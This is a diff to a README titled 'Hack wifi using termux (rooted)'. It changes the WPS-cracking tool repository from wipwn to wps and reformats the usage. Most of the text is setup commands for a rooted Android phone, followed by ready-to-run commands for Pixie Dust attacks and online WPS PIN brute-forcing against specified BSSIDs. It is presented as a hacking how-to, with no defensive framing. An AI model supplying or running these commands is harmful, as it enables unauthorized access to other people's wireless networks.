@@ -9,29 +9,40 @@ Hack wifi using termux (rooted)
 pkg update && pkg upgrade -y
 pkg install root-repo -y
 pkg install git tsu python termux-api wpa-supplicant pixiewps iw -y
-git clone https://github.com/ShTasrif/wipwn
+git clone https://github.com/Gtajisan/wps
 pip install requests
-cd wipwn
-chmod +x wipwn.py
+cd wps
+chmod +x wps.py
 ```
 ### Single cmd Setup
-```bash
-curl https://raw.githubusercontent.com/ShTasrif/wipwn/main/wipwn --output /data/data/com.termux/files/usr/bin/wipwn
-chmod +x /data/data/com.termux/files/usr/bin/wipwn
 ```
-#### Help : `sudo python wipwn.py --help`
-#### Example : `sudo python wipwn.py -i wlan0 -K`
+https://github.com/Gtajisan/wps
+```
+#### Help : 
+```
+sudo python wps.py --help
+```
+#### Example : 
+```
+sudo python wps.py -i wlan0 -K
+```
 
 #### Note: 
 + **First turn off your Wifi.**
 + **Turn on Hotspot.**
 + **Turn on Location.**
 - Show avaliable networks and start Pixie Dust attack on a specified network.
-- `sudo python wipwn.py -i wlan0 -K`
-- - Start Pixie Dust attack on a specified BSSID:
-`sudo python wipwn.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
+```
+sudo python wps.py -i wlan0 -K
+```
+- Start Pixie Dust attack on a specified BSSID:
+```
+sudo python wps.py -i wlan0 -b 00:91:4C:C3:AC:28 -K
+```
 - Launch online WPS bruteforce with the specified first half of the PIN:
-- `sudo python wipwn.py -i wlan0 -b 50:0F:F5:B0:08:05 -B -p 1234`
+```
+ sudo python wps.py -i wlan0 -b 50:0F:F5:B0:08:05 -B -p 1234
+```
 ### Troubleshooting
 **"Device or resource busy (-16)" - Turn on Wifi and Then Turn off Wifi.**
 #### Modify History : 
